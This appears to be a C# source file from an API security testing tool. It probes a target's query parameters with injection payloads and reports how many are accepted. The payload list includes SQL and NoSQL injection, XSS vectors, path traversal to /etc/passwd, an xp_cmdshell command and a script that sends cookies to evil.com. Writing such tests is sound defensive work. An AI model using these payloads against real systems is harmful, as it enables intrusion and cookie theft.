namespace API_Tester;

public partial class MainPage
{
    /*
    Input Injection Security Test

    Purpose:
    Tests the application for vulnerabilities related to input injection,
    including SQL, NoSQL, command, and other injection types that may
    compromise data integrity, confidentiality, or system behavior.

    Threat Model:
    Applications that fail to properly validate or sanitize user inputs
    can be exploited by attackers to:

        - Manipulate database queries or commands
        - Execute unauthorized system commands
        - Access or modify sensitive data
        - Circumvent authentication or authorization controls

    Common injection targets include:

        - Form fields, query parameters, and URL paths
        - JSON or XML payloads
        - HTTP headers, cookies, and session tokens

    Test Strategy:
    The method performs asynchronous automated tests to:

        - Submit crafted payloads designed to trigger injection vulnerabilities
        - Analyze responses for signs of improper input handling
        - Verify proper escaping, parameterization, or input sanitization
        - Identify potential injection points that could be exploited

    Potential Impact:
    Successful injection attacks may allow attackers to:

        - Retrieve, modify, or delete sensitive data
        - Execute arbitrary commands on the server
        - Bypass access controls or elevate privileges
        - Disrupt application functionality or availability

    Expected Behavior:
    Applications should:

        - Validate and sanitize all user-supplied inputs
        - Use parameterized queries or prepared statements
        - Enforce strict input formats and length restrictions
        - Handle errors securely without exposing internal information
    */

    private static string[] GetSecurityInputInjectionControlsPayloads() =>
    [
        "' OR '1'='1",
        "<svg/onload=alert(1)>",
        "{\"$gt\":\"\"}",
        "..%2f..%2f..%2fetc%2fpasswd",
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<body onload=eval('alert(1)')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "foo' UNION SELECT 1,2,3--",
        "..\\..\\..\\..\\windows\\system32\\cmd.exe",
        "<script>fetch('http://evil.com?cookie=' + document.cookie)</script>",
        "'); EXEC xp_cmdshell('dir'); --",
        "/etc/passwd%00",
        "%0d%0aContent-Length: 0%0d%0a"
    ];

    private HttpRequestMessage FormatSecurityInputInjectionControlsRequest(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["input"] = payload,
            ["query"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunSecurityInputInjectionControlsTestsAsync(Uri baseUri)
    {
        var payloads = GetSecurityInputInjectionControlsPayloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatSecurityInputInjectionControlsRequest(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: insufficient input validation on {accepted}/{payloads.Length} probes."
            : "No obvious input-injection weakness across tested payloads.");

        return FormatSection("CSA API Security Input Injection Controls", baseUri, findings);
    }
}
